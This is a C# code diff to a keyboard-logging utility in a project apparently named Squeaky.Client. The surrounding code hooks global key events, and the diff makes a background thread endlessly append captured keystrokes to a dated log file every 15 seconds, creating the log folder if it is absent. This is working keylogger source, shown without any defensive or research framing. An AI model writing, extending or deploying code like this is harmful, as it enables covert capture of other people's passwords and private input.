@@ -22,26 +22,29 @@ namespace Squeaky.Client.Utilities
 
         private static void WriteLoop()
         {
-            var dateFile = DateTime.Now.ToString("M-d-yyyy") + ".log";
-
-            foreach (string file in Directory.GetFiles(LogDir))
+            while (true)
             {
-                if (file == dateFile)
-                {
-                    FirstLine = false;
-                }
-            }
+                var dateFile = DateTime.Now.ToString("M-d-yyyy") + ".log";
 
-            if (LogBuffer.Length != 0)
-            {
-                using (StreamWriter sw = File.CreateText($"{LogDir}{dateFile}"))
+                foreach (string file in Directory.GetFiles(LogDir))
                 {
-                    sw.Write(LogBuffer);
-                    LogBuffer.Clear();
+                    if (file == dateFile)
+                    {
+                        FirstLine = false;
+                    }
                 }
-            }
 
-            Thread.Sleep(15000);
+                if (LogBuffer.Length != 0)
+                {
+                    using (StreamWriter sw = File.AppendText($"{LogDir}{dateFile}"))
+                    {
+                        sw.Write(LogBuffer);
+                        LogBuffer.Clear();
+                    }
+                }
+
+                Thread.Sleep(15000);
+            }
         }
 
         private static void OnKeyDown(object sender, KeyEventArgs e)
@@ -79,6 +82,8 @@ namespace Squeaky.Client.Utilities
             hook.KeyDown += OnKeyDown;
             hook.KeyUp += OnKeyUp;
             hook.KeyPress += OnKeyPress;
+
+            if (!Directory.Exists(LogDir)) Directory.CreateDirectory(LogDir);
 
             Thread WriteLoopThread = new Thread(WriteLoop);
             WriteLoopThread.Start();
